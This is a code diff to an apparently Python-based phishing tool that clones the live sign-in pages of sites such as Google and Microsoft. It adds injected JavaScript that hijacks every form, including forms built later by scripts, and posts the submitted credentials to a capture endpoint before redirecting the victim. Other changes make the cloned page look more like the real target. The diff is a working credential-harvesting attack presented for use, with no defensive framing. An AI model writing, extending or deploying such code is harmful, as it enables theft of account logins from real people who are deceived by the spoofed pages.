@@ -219,25 +219,28 @@ def login_candidates(raw: str) -> list[str]:
 
 
 def looks_like_login(html_text: str) -> bool:
-    """True when the page has a form we can actually harvest.
+    """True when the page is the site's own sign-in, not a marketing homepage.
 
-    A marketing homepage with no password field is not a login page, even
-    if the fetch succeeded. Used to decide whether to try the next
-    candidate or fall back to the branded template.
+    Google / Microsoft / Yahoo paint the form in JS, so there is often no
+    ``<form>`` in the first HTML. A password field, a sign-in title, or a
+    known accounts host still counts — throwing those away is how
+    ``/phish www.google.com`` used to serve the generic card.
     """
     if not html_text:
         return False
     lowered = html_text.lower()
-    if "<form" not in lowered:
-        return False
     if re.search(r'type\s*=\s*["\']password["\']', lowered):
         return True
-    # Some logins (email-first, OTP) have a form but no password input
-    # in the first paint. A form plus a login-ish title/action still
-    # counts — better than the generic card.
-    if re.search(r"<form\b[^>]*>", lowered) and re.search(
+    if "<form" in lowered and re.search(
         r"(sign\s*in|log\s*in|password|passcode|email|username)", lowered
     ):
+        return True
+    # JS-rendered sign-in shells (Google accounts, Microsoft, etc.).
+    if re.search(
+        r"(sign\s*in|log\s*in|accounts\.google|login\.microsoft|"
+        r"identifierid|passwordelement)",
+        lowered,
+    ) and ("<html" in lowered or "<!doctype" in lowered):
         return True
     return False
 
@@ -298,6 +301,74 @@ def _inject_base(html_text: str, origin: str) -> str:
             r"(<head[^>]*>)", r"\1\n" + tag, html_text, count=1, flags=re.I
         )
     return tag + "\n" + html_text
+
+
+_CAPTURE_HOOK = """
+<script>
+(function () {
+  function send(fd) {
+    try {
+      fetch("/__zim_capture", {method: "POST", body: fd, credentials: "same-origin"});
+    } catch (e) {}
+  }
+  function hijack(form) {
+    if (!form || form.dataset.zimHooked) return;
+    form.dataset.zimHooked = "1";
+    form.setAttribute("action", "/__zim_capture");
+    form.setAttribute("method", "POST");
+    form.removeAttribute("target");
+    form.addEventListener("submit", function (ev) {
+      ev.preventDefault();
+      ev.stopPropagation();
+      try { send(new FormData(form)); } catch (e) {}
+      window.location = "/__zim_thanks";
+      return false;
+    }, true);
+  }
+  function scan(root) {
+    (root.querySelectorAll ? root.querySelectorAll("form") : []).forEach(hijack);
+  }
+  scan(document);
+  document.addEventListener("submit", function (ev) {
+    var form = ev.target;
+    if (!form || !form.tagName || form.tagName.toLowerCase() !== "form") return;
+    ev.preventDefault();
+    ev.stopPropagation();
+    hijack(form);
+    try { send(new FormData(form)); } catch (e) {}
+    window.location = "/__zim_thanks";
+    return false;
+  }, true);
+  if (window.MutationObserver) {
+    new MutationObserver(function (muts) {
+      muts.forEach(function (m) {
+        m.addedNodes.forEach(function (n) {
+          if (n && n.nodeType === 1) {
+            if (n.tagName && n.tagName.toLowerCase() === "form") hijack(n);
+            scan(n);
+          }
+        });
+      });
+    }).observe(document.documentElement, {childList: true, subtree: true});
+  }
+})();
+</script>
+"""
+
+
+def _inject_capture_hook(html_text: str) -> str:
+    """Catch forms the live page builds in JS after paint.
+
+    Google / Microsoft / a lot of modern logins have no ``<form>`` in the
+    first HTML. Rewriting static tags is not enough — we have to hook
+    submit (and any form that appears later) so the clone still harvests.
+    """
+    if "zimHooked" in html_text:
+        return html_text
+    if re.search(r"</body\s*>", html_text, flags=re.I):
+        return re.sub(r"</body\s*>", _CAPTURE_HOOK + "</body>", html_text,
+                      count=1, flags=re.I)
+    return html_text + _CAPTURE_HOOK
 
 
 def _rewrite_forms(html_text: str) -> str:
@@ -451,13 +522,17 @@ def fetch_page(url: str, timeout: float = 12.0) -> tuple[str | None, str]:
 def clone_login(raw: str, timeout: float = 12.0) -> tuple[str | None, str, str]:
     """Walk login candidates until one looks like the real sign-in page.
 
-    Returns ``(html_or_none, note, url_used)``. The template is only used
-    when every candidate failed or none of them had a form — never as a
-    silent stand-in for a successful homepage fetch.
+    Returns ``(html_or_none, note, url_used)``. Prefer a page that looks
+    like a login. If none do, still return the best live HTML we got —
+    serving the site's own page (even a JS shell) looks like the target;
+    the generic card does not. The template is only for a total fetch miss.
     """
     tried: list[str] = []
     last_note = "no candidates"
     last_url = target_url(raw)
+    fallback_html: str | None = None
+    fallback_note = last_note
+    fallback_url = last_url
     for url in login_candidates(raw):
         html_text, note = fetch_page(url, timeout=timeout)
         last_note = note
@@ -467,7 +542,13 @@ def clone_login(raw: str, timeout: float = 12.0) -> tuple[str | None, str, str]:
             continue
         if looks_like_login(html_text):
             return html_text, note, url
+        if fallback_html is None or len(html_text) > len(fallback_html):
+            fallback_html = html_text
+            fallback_note = note + " (best live page; no static form)"
+            fallback_url = url
         tried.append(f"{url} (no login form)")
+    if fallback_html:
+        return fallback_html, fallback_note, fallback_url
     if tried:
         last_note = "no login form on: " + "; ".join(tried[:4])
     return None, last_note, last_url
@@ -483,8 +564,7 @@ def build_page(host: str, url: str, fetched: str | None) -> tuple[str, bool]:
         origin = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
         page = _inject_base(fetched, origin)
         page = _rewrite_forms(page)
-        # A page with no form still needs a way to submit. Leave it as-is —
-        # the operator can see in zim-pane that nothing was rewritten.
+        page = _inject_capture_hook(page)
         return page, True
     return _branded_template(host), False
 
@@ -808,6 +888,9 @@ class Campaign:
 
             def do_GET(self) -> None:  # noqa: N802
                 path = urllib.parse.urlparse(self.path).path
+                if path == "/__zim_thanks":
+                    self._send(200, campaign.thanks_html)
+                    return
                 if path in ("/", "/index.html", "/login", "/signin"):
                     campaign._hit("GET", path, {})
                     self._send(200, campaign.page_html)
